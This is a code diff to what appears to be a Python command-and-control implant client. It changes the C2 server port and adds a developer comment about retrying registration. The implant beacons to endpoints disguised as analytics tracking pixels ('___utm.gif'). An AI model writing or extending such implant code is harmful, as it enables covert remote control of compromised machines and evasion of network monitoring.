@@ -5,7 +5,7 @@ import time
 import msgpack
 import requests
 
-PORT = 8030
+PORT = 8050
 URL = f"http://10.0.0.30:{PORT}/___utm.gif"
 POST_URL = f"http://10.0.0.30:{PORT}/__utm.gif"
 
@@ -129,6 +129,9 @@ def send_task_response(implant_uuid: str, task_uuid: str):
 
 
 if __name__ == "__main__":
+    # HUGE NOTE: if implant misses register, it won't connect.
+    # Design choice - and I like it - need to set a loop that if not registered, keep reaching out, maybe X times,
+    # before dying
     implant_uuid = register()
 
     while True:
